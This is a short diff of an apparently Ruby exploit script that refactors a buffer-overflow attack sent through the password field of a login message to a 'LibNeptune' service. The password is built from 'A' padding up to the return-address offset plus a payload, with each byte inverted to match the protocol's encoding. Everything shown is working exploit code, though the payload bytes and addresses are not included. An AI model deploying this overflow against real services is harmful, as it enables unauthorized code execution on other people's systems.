@@ -58,21 +58,17 @@ if PAYLOAD.include?("\xff")
   exit 1
 end
 
-OVERFLOW_PADDING = ("A" * RETURN_ADDRESS_OFFSET)
-
-USERNAME = "test"
-PASSWORD = OVERFLOW_PADDING + PAYLOAD
-
+PADDING = ("A" * RETURN_ADDRESS_OFFSET)
 connection.send_recv(
   args: [
     # Message type
     { type: :integer, value: LibNeptune::MESSAGE_LOGIN },
 
     # Username
-    { type: :string, value: USERNAME },
+    { type: :string, value: 'test' },
 
     # Password (encoded by making each byte negative)
-    { type: :string, value: PASSWORD.bytes.map { |b| (0x0FF & (~b)).chr }.join },
+    { type: :string, value: (PADDING + PAYLOAD).bytes.map { |b| (0x0FF & (~b)).chr }.join },
   ],
 )
 
